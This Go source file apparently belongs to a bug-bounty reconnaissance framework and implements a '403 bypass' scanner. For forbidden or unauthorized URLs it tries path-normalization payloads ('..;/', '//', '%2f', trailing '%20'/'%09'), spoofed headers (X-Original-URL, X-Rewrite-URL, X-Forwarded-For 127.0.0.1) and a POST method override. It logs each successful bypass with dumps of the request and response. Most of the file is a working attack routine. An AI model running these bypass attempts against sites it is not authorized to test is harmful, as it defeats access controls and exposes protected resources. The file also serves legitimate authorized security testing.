package tools

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"github.com/Developer-Army/BBPTS/internal/domain/recon"
	"io"
	"log/slog"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

type Bypass403Tool struct{}

func (t *Bypass403Tool) Name() string {
	return "bypass403"
}

func (t *Bypass403Tool) Run(ctx context.Context, scanCtx *recon.ScanContext, targets []string, threads int) ([]recon.Event, error) {
	if len(targets) == 0 {
		return nil, nil
	}

	rateLimit := ToolRateLimitFromCtx(ctx, t.Name())
	if rateLimit <= 0 {
		rateLimit = 50
	}
	pool := NewWorkerPool(threads, rate.Limit(rateLimit))

	return pool.Process(ctx, targets, func(ctx context.Context, target string) ([]recon.Event, error) {
		target = strings.TrimSpace(target)
		if target == "" {
			return nil, nil
		}

		if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
			target = "https://" + target
		}

		client := NewSafeHTTPClient(5 * time.Second)
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		}

		req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
		if err != nil {
			return nil, nil
		}
		headers := scanCtx.Headers
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			return nil, nil
		}
		initialLen, initialHash := getResponseFingerprint(resp)
		resp.Body.Close()

		if resp.StatusCode != http.StatusForbidden && resp.StatusCode != http.StatusUnauthorized {
			return nil, nil
		}

		parsed, err := url.Parse(target)
		if err != nil {
			return nil, nil
		}

		var events []recon.Event
		var mu sync.Mutex

		// Perform canary check for wildcard 200 OK or CDN behavior
		var hasCanary200 bool
		var canaryLen int64
		var canaryHash string

		canaryURL := parsed.Scheme + "://" + parsed.Host + "/$bbpts_canary_404/"
		canaryReq, err := http.NewRequestWithContext(ctx, "GET", canaryURL, nil)
		if err == nil {
			for k, v := range headers {
				canaryReq.Header.Set(k, v)
			}
			canaryResp, err := client.Do(canaryReq)
			if err == nil {
				if canaryResp.StatusCode == http.StatusOK {
					hasCanary200 = true
					canaryLen, canaryHash = getResponseFingerprint(canaryResp)
				}
				canaryResp.Body.Close()
			}
		}

		checkBypassResponse := func(bypassReq *http.Request, bypassResp *http.Response) (bool, string, string) {
			reqDump, _ := httputil.DumpRequestOut(bypassReq, true)
			respDump, _ := httputil.DumpResponse(bypassResp, false)

			body, _ := io.ReadAll(io.LimitReader(bypassResp.Body, 4096))
			bypassResp.Body.Close()

			fullResp := string(respDump) + string(body)
			if bypassResp.StatusCode != http.StatusOK {
				return false, string(reqDump), fullResp
			}
			bLen := int64(len(body))
			h := sha256.Sum256(body)
			bHash := hex.EncodeToString(h[:])

			if hasCanary200 && bLen == canaryLen && bHash == canaryHash {
				return false, string(reqDump), fullResp
			}

			if bLen == initialLen && bHash == initialHash {
				return false, string(reqDump), fullResp
			}
			return true, string(reqDump), fullResp
		}

		path := parsed.Path
		pathBypasses := []string{

			target + "/",
			target + "/./",
			target + "/.",

			target + "..;/",
			parsed.Scheme + "://" + parsed.Host + "/..;" + path,

			parsed.Scheme + "://" + parsed.Host + "//" + strings.TrimPrefix(path, "/"),

			parsed.Scheme + "://" + parsed.Host + strings.ToUpper(path),

			parsed.Scheme + "://" + parsed.Host + path + "%20",
			parsed.Scheme + "://" + parsed.Host + path + "%09",

			parsed.Scheme + "://" + parsed.Host + "/%2f" + strings.TrimPrefix(path, "/"),
		}

		for _, bypassURL := range pathBypasses {
			bypassReq, err := http.NewRequestWithContext(ctx, "GET", bypassURL, nil)
			if err != nil {
				continue
			}
			for k, v := range headers {
				bypassReq.Header.Set(k, v)
			}
			bypassResp, err := client.Do(bypassReq)
			if err == nil {
				if ok, reqDump, respDump := checkBypassResponse(bypassReq, bypassResp); ok {
					mu.Lock()
					events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Path Normalization",
						"url":         bypassURL,
						"description": fmt.Sprintf("Bypassed forbidden page via path normalization: %s", bypassURL),
						"request":     reqDump,
						"response":    respDump,
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "url", bypassURL)
					return events, nil
				}
			}
		}

		headerBypasses := []struct {
			name  string
			value string
			url   string
		}{
			{"X-Original-URL", parsed.Path, parsed.Scheme + "://" + parsed.Host + "/"},
			{"X-Rewrite-URL", parsed.Path, parsed.Scheme + "://" + parsed.Host + "/"},
			{"X-Forwarded-For", "127.0.0.1", target},
			{"X-Custom-IP-Authorization", "127.0.0.1", target},
		}

		for _, bypass := range headerBypasses {
			bypassReq, err := http.NewRequestWithContext(ctx, "GET", bypass.url, nil)
			if err != nil {
				continue
			}
			for k, v := range headers {
				bypassReq.Header.Set(k, v)
			}
			bypassReq.Header.Set(bypass.name, bypass.value)
			bypassResp, err := client.Do(bypassReq)
			if err == nil {
				if ok, reqDump, respDump := checkBypassResponse(bypassReq, bypassResp); ok {
					mu.Lock()
					events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Header Override",
						"header":      bypass.name,
						"description": fmt.Sprintf("Bypassed restriction using header %s: %s", bypass.name, bypass.value),
						"request":     reqDump,
						"response":    respDump,
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "header", bypass.name)
					return events, nil
				}
			}
		}

		methodReq, err := http.NewRequestWithContext(ctx, "POST", target, nil)
		if err == nil {
			for k, v := range headers {
				methodReq.Header.Set(k, v)
			}
			methodReq.Header.Set("X-HTTP-Method-Override", "GET")
			methodResp, err := client.Do(methodReq)
			if err == nil {
				if ok, reqDump, respDump := checkBypassResponse(methodReq, methodResp); ok {
					mu.Lock()
					events = append(events, recon.NewEventWithSeverity(target, t.Name(), "vulnerability", map[string]string{
						"vuln_name":   "403/401 Auth Bypass",
						"severity":    "high",
						"bypass_type": "Method Override",
						"description": "Bypassed restriction using POST method override.",
						"request":     reqDump,
						"response":    respDump,
					}, "high"))
					mu.Unlock()
					slog.Warn("Found 403 bypass", "target", target, "method", "POST override")
				}
			}
		}

		return events, nil
	})
}

func getResponseFingerprint(resp *http.Response) (int64, string) {
	if resp == nil || resp.Body == nil {
		return 0, ""
	}
	limitReader := io.LimitReader(resp.Body, 4096)
	bodyBytes, err := io.ReadAll(limitReader)
	if err != nil {
		return 0, ""
	}
	h := sha256.Sum256(bodyBytes)
	return int64(len(bodyBytes)), hex.EncodeToString(h[:])
}

var _ recon.Tool = (*Bypass403Tool)(nil)
